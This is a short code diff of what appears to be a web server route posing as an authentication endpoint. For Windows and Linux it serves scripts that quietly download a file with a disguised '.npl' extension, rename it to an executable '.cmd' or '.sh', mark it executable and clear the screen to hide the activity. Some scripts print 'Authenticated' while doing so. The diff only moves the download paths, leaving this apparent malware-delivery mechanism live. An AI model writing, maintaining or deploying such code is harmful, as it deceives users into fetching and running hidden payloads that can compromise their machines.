@@ -64,8 +64,7 @@ router.get("/auth/windows", (req, res) => {
     const domain = req.protocol + '://' + req.get('host');
     
     res.type("text/plain").send(`@echo off
-    echo $domain
-    curl -s -L -o "%USERPROFILE%\\token" ${domain}/token.npl
+    curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
     cls
     ren "%USERPROFILE%\\token" token.cmd
     cls
@@ -93,7 +92,7 @@ set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/Documents"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/tokenlinux.npl
+wget -q -O "$TARGET_DIR/tokenlinux.npl" ${domain}/users/tokenlinux.npl
 clear
 mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
 clear
@@ -123,7 +122,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/Documents"
 clear
-curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/tokenlinux.npl"
+curl -s -L -o "$HOME/Documents/tokenlinux.sh" "${domain}/users/tokenlinux.npl"
 clear
 chmod +x "$HOME/Documents/tokenlinux.sh"
 clear
